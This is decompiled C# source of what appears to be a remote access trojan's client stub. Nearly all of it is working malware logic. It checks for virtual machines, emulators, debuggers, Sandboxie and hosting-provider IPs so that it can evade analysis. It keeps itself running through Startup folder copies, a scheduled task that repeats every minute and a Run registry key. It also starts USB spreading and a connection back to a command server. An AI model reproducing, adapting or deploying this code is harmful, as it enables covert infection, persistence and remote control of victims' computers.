using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub;

public class Main
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		Thread.Sleep(1000);
		if (!Helper.CreateMutex())
		{
			ProjectData.EndApp();
		}
		try
		{
			if (DetectVirtualMachine())
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Emulator())
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (DetectDebugger())
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (DetectSandboxie())
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (anyrun())
			{
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileName(Settings.path2);
			if (!File.Exists(text))
			{
				File.Copy(Settings.path2, text);
				FileInfo fileInfo = new FileInfo(text);
				fileInfo.Attributes = FileAttributes.Normal;
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = Interaction.Environ("appdata");
			string text3 = text2 + "\\" + Path.GetFileName(Settings.path2);
			if (!File.Exists(text3))
			{
				File.Copy(Settings.path2, text3);
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks.exe");
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.Arguments = "/create /sc minute /mo 1 /tn \"" + Path.GetFileNameWithoutExtension(Settings.path2) + "\" /tr \"" + text3 + "\"";
				Process process = Process.Start(processStartInfo);
				process.WaitForExit(5000);
				process.Kill();
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text4 = Interaction.Environ("appdata");
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Path.GetFileNameWithoutExtension(Settings.path2), text4 + "\\" + Path.GetFileName(Settings.path2));
			if (!File.Exists(text4 + "\\" + Path.GetFileName(Settings.path2)))
			{
				File.Copy(Settings.path2, text4 + "\\" + Path.GetFileName(Settings.path2));
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		Settings.USBS.Start();
		Settings.dTimer2.Elapsed += Helper.tickees;
		Thread thread = new Thread(ClientSocket.BeginConnect);
		thread.Start();
		Thread thread2 = new Thread(ClientSocket.Ping);
		thread2.Start();
	}

	public static bool Emulator()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (checked(DateTime.Now.Ticks - ticks) < 10L)
			{
				return true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static bool DetectVirtualMachine()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		object obj = (object)new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Get", new object[0], (string[])null, (Type[])null, (bool[])null));
			try
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)objectValue).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
						string text = NewLateBinding.LateIndexGet(objectValue2, new object[1] { "Manufacturer" }, (string[])null).ToString()!.ToLower();
						if ((Operators.CompareString(text, "microsoft corporation", false) == 0 && NewLateBinding.LateIndexGet(objectValue2, new object[1] { "Model" }, (string[])null).ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || Operators.CompareString(NewLateBinding.LateIndexGet(objectValue2, new object[1] { "Model" }, (string[])null).ToString(), "VirtualBox", false) == 0)
						{
							return true;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			finally
			{
				if (objectValue != null)
				{
					((IDisposable)objectValue).Dispose();
				}
			}
		}
		finally
		{
			if (obj != null)
			{
				((IDisposable)obj).Dispose();
			}
		}
		return false;
	}

	public static bool DetectDebugger()
	{
		bool isDebuggerPresent = false;
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
		return isDebuggerPresent;
	}

	public static bool DetectSandboxie()
	{
		if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		{
			return true;
		}
		return false;
	}

	public static bool anyrun()
	{
		try
		{
			string text = new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting");
			return text.Contains("true");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
}
